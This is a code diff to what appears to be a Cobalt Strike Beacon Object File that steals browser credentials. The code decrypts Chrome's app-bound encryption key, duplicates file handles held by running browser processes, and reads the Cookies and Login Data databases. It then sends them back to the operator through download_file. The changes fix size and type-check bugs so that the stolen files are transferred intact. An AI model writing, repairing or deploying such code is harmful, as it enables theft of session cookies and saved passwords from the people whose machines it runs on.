@@ -12,7 +12,7 @@
 #include "beacon.h"
 
 WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError (VOID);
-WINBASEAPI HANDLE  WINAPI KERNEL32$CreateFileA (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+WINBASEAPI HANDLE  WINAPI KERNEL32$CreateFileA (LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
 WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
 WINBASEAPI DWORD   WINAPI KERNEL32$GetFileSize (HANDLE hFile, LPDWORD lpFileSizeHigh);
 WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalAlloc (UINT uFlags, SIZE_T dwBytes);
@@ -96,7 +96,11 @@ FARPROC Resolver(CHAR *lib, CHAR *func) {
     return ptr;
 }
 
-CHAR *GetFileContent(CHAR *path) {
+// Forward declarations
+BOOL download_file( IN LPCSTR fileName, IN char fileData[], IN ULONG32 fileLength);
+BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR * folderPath);
+
+CHAR *GetFileContent(CHAR *path, DWORD *outSize) {
     CHAR fullPath[MAX_PATH];
     HANDLE hFile = NULL;
     IMPORT_RESOLVE;
@@ -132,6 +136,7 @@ CHAR *GetFileContent(CHAR *path) {
         BeaconPrintf(CALLBACK_OUTPUT,"file size mismatch.\n");
     }
     KERNEL32$CloseHandle(hFile);
+    if (outSize) { *outSize = dwSize; }
     return buffer;
 }
 
@@ -351,7 +356,7 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
         //BeaconPrintf(CALLBACK_OUTPUT, "Decryption succeeded.\n");
         DWORD decrypted_size = OLEAUT32$SysStringByteLen(plaintext_data);
         //BeaconPrintf(CALLBACK_OUTPUT, "Decrypted Data Size: %d\n", decrypted_size);
-        BeaconPrintf(CALLBACK_OUTPUT, "Decrypted App Bound Key: %s\n", BytesToHexString(plaintext_data, decrypted_size));
+        BeaconPrintf(CALLBACK_OUTPUT, "Decrypted App Bound Key: %s\n", BytesToHexString((const BYTE*)plaintext_data, decrypted_size));
 
     } else {
         BeaconPrintf(CALLBACK_ERROR, "App Bound Key Decryption failed. Last error: %lu\n If error 203, beacon is most likely not operating out of correct file path \n", last_error);
@@ -409,7 +414,8 @@ VOID GetEncryptionKey(char * browser) {
     // GetMasterKey(key);
 
     CHAR *app_key = NULL;
-    CHAR *app_data = GetFileContent(localStatePath);
+    DWORD _lsSize = 0;
+    CHAR *app_data = GetFileContent(localStatePath, &_lsSize);
     CHAR app_pattern[] =  "\"app_bound_encrypted_key\":\"";
     if(app_data == NULL) {
         BeaconPrintf(CALLBACK_ERROR,"Reading the file failed.\n");
@@ -625,7 +631,8 @@ VOID GetBrowserData(char * browser, int cookie, int loginData, char * folderPath
     if (processCount == 0) {
         //check if file exists
         BeaconPrintf(CALLBACK_OUTPUT,"%s not found running on host\n Downloading cookies directly from %s \n", browser, cookieDB);
-        CHAR *data = GetFileContent(cookiePath);
+        DWORD cookieSize = 0;
+        CHAR *data = GetFileContent(cookiePath, &cookieSize);
         if(data == NULL) {
             BeaconPrintf(CALLBACK_ERROR,"%s COOKIES not found on host\n", browser);
             return;
@@ -640,17 +647,18 @@ VOID GetBrowserData(char * browser, int cookie, int loginData, char * folderPath
                 BeaconPrintf(CALLBACK_ERROR, "Failed to write cookie file to %s\n", cookieFilePath);
             } else {
                 DWORD written = 0;
-                KERNEL32$WriteFile(hFile, data, KERNEL32$GetFileSize(hFile, NULL), &written, NULL);
+                KERNEL32$WriteFile(hFile, data, cookieSize, &written, NULL);
                 BeaconPrintf(CALLBACK_OUTPUT, "Wrote cookie file to: %s\n", cookieFilePath);
                 KERNEL32$CloseHandle(hFile);
             }
             
         } else {
-            download_file(cookieDB,data, sizeof(data));
+            download_file(cookieDB, data, cookieSize);
         }
         //download_file(cookieDB,data, sizeof(data));
         KERNEL32$GlobalFree(data);
-        CHAR *passwordData = GetFileContent(passwordPath);
+        DWORD pwdSize = 0;
+        CHAR *passwordData = GetFileContent(passwordPath, &pwdSize);
         if(passwordData == NULL) {
             BeaconPrintf(CALLBACK_ERROR,"%s LOGIN DATA not found on host\n", browser);
             return;
@@ -665,12 +673,12 @@ VOID GetBrowserData(char * browser, int cookie, int loginData, char * folderPath
                 BeaconPrintf(CALLBACK_ERROR, "Failed to write password file to %s\n", passwordFilePath);
             } else {
                 DWORD written = 0;
-                KERNEL32$WriteFile(hFile, passwordData, KERNEL32$GetFileSize(hFile, NULL), &written, NULL);
+                KERNEL32$WriteFile(hFile, passwordData, pwdSize, &written, NULL);
                 BeaconPrintf(CALLBACK_OUTPUT, "Wrote password file to: %s\n", passwordFilePath);
                 KERNEL32$CloseHandle(hFile);
             }
         } else {
-            download_file(passwordDB,passwordData, sizeof(passwordData));
+            download_file(passwordDB, passwordData, pwdSize);
         }
         //download_file(passwordDB,passwordData, sizeof(passwordData));
         KERNEL32$GlobalFree(passwordData);
@@ -694,7 +702,7 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
     {
         dwSize = dwNeeded;
         shi = (SYSTEM_HANDLE_INFORMATION_EX*)KERNEL32$GlobalReAlloc(shi, dwSize, GMEM_MOVEABLE);
-        if (dwSize == NULL)
+        if (dwSize == 0 || shi == NULL)
         {
             BeaconPrintf(CALLBACK_ERROR, "Failed to reallocate memory for handle information.\n");
             KERNEL32$GlobalFree(shi);
@@ -763,47 +771,50 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
                         MSVCRT$free(objectNameInfo);
                         return FALSE;
                     }
-                    if (ret == 0 && (MSVCRT$strcmp(objectTypeInfo,"File"))){
-                        //BeaconPrintf(CALLBACK_OUTPUT, "%s\n", handleName);
-                        //BeaconPrintf(CALLBACK_OUTPUT, "%d\n", MSVCRT$strlen(handleName));
-                        if (MSVCRT$strstr(handleName, browserFile) != NULL && (MSVCRT$strcmp(&handleName[MSVCRT$strlen(handleName) - 4], "Data") == 0 || MSVCRT$strcmp(&handleName[MSVCRT$strlen(handleName) - 7], "Cookies") == 0)){
+                    if (ret == 0){
+                        char typeName[64];
+                        MSVCRT$sprintf(typeName, "%.*ws", objectTypeInfo->TypeName.Length / sizeof(WCHAR), objectTypeInfo->TypeName.Buffer);
+                        if (MSVCRT$strcmp(typeName, "File") == 0){
+                            //BeaconPrintf(CALLBACK_OUTPUT, "%s\n", handleName);
+                            //BeaconPrintf(CALLBACK_OUTPUT, "%d\n", MSVCRT$strlen(handleName));
+                            if (MSVCRT$strstr(handleName, browserFile) != NULL && (MSVCRT$strcmp(&handleName[MSVCRT$strlen(handleName) - 4], "Data") == 0 || MSVCRT$strcmp(&handleName[MSVCRT$strlen(handleName) - 7], "Cookies") == 0)){
 
-                            BeaconPrintf(CALLBACK_OUTPUT,"Handle to %s Was FOUND with PID: %lu\n", browserFile, PID);
-                            //BeaconPrintf(CALLBACK_OUTPUT, "Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
+                                BeaconPrintf(CALLBACK_OUTPUT,"Handle to %s Was FOUND with PID: %lu\n", browserFile, PID);
+                                //BeaconPrintf(CALLBACK_OUTPUT, "Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
 
-                            KERNEL32$SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
-                            DWORD dwFileSize = KERNEL32$GetFileSize(hDuplicate, NULL);
-                            BeaconPrintf(CALLBACK_OUTPUT,"file size is %d\n", dwFileSize);
-                            DWORD dwRead = 0;
-                            CHAR *buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
-                            KERNEL32$ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);
+                                KERNEL32$SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
+                                DWORD dwFileSize = KERNEL32$GetFileSize(hDuplicate, NULL);
+                                BeaconPrintf(CALLBACK_OUTPUT,"file size is %d\n", dwFileSize);
+                                DWORD dwRead = 0;
+                                CHAR *buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
+                                KERNEL32$ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);
 
-                            //if folder path is not null, then copy to folder instead of download_file()
-                            if (MSVCRT$strcmp(folderPath, "") != 0){
-                                CHAR copyFilePath[MAX_PATH];
-                                MSVCRT$sprintf(copyFilePath, "%s\\%s", folderPath, downloadFileName);
-                                HANDLE hFile = KERNEL32$CreateFileA(copyFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-                    
-                                if (hFile == INVALID_HANDLE_VALUE) {
-                                    BeaconPrintf(CALLBACK_ERROR, "Failed to write password file to %s\n", copyFilePath);
-                                } else {
-                                    DWORD written = 0;
-                                    KERNEL32$WriteFile(hFile, buffer, dwFileSize, &written, NULL);
-                                    BeaconPrintf(CALLBACK_OUTPUT, "Wrote password file to: %s\n", copyFilePath);
-                                    KERNEL32$CloseHandle(hFile);
-                                }
-                            } else {
-                                download_file(downloadFileName,buffer, dwFileSize);
-                            }
-                            
-                            KERNEL32$GlobalFree(buffer);
-                            KERNEL32$GlobalFree(shi);
-                            MSVCRT$free(objectTypeInfo);
-                            MSVCRT$free(objectNameInfo);
-                            return TRUE;
-                        }
+                                //if folder path is not null, then copy to folder instead of download_file()
+                                if (MSVCRT$strcmp(folderPath, "") != 0){
+                                    CHAR copyFilePath[MAX_PATH];
+                                    MSVCRT$sprintf(copyFilePath, "%s\\%s", folderPath, downloadFileName);
+                                    HANDLE hFile = KERNEL32$CreateFileA(copyFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                         
-                    }else{
+                                    if (hFile == INVALID_HANDLE_VALUE) {
+                                        BeaconPrintf(CALLBACK_ERROR, "Failed to write password file to %s\n", copyFilePath);
+                                    } else {
+                                        DWORD written = 0;
+                                        KERNEL32$WriteFile(hFile, buffer, dwFileSize, &written, NULL);
+                                        BeaconPrintf(CALLBACK_OUTPUT, "Wrote password file to: %s\n", copyFilePath);
+                                        KERNEL32$CloseHandle(hFile);
+                                    }
+                                } else {
+                                    download_file(downloadFileName,buffer, dwFileSize);
+                                }
+                                
+                                KERNEL32$GlobalFree(buffer);
+                                KERNEL32$GlobalFree(shi);
+                                MSVCRT$free(objectTypeInfo);
+                                MSVCRT$free(objectNameInfo);
+                                return TRUE;
+                            }
+                        }
+                        // not a file of interest or type mismatch, cleanup
                         KERNEL32$CloseHandle(hDuplicate);
                         MSVCRT$free(objectTypeInfo);
                         MSVCRT$free(objectNameInfo);
@@ -1030,7 +1041,8 @@ BYTE* decrypt_with_cng(const BYTE* input_data, DWORD input_size, DWORD* output_s
 BOOL AppBoundDecryptor(char * localStateFile, int pid){
     IMPORT_RESOLVE;
 
-    char * app_data = GetFileContent(localStateFile);
+    DWORD _lsSize2 = 0;
+    char * app_data = GetFileContent(localStateFile, &_lsSize2);
     CHAR app_pattern[] =  "\"app_bound_encrypted_key\":\"";
     if(app_data == NULL) {
         BeaconPrintf(CALLBACK_ERROR,"Reading the file failed.\n");
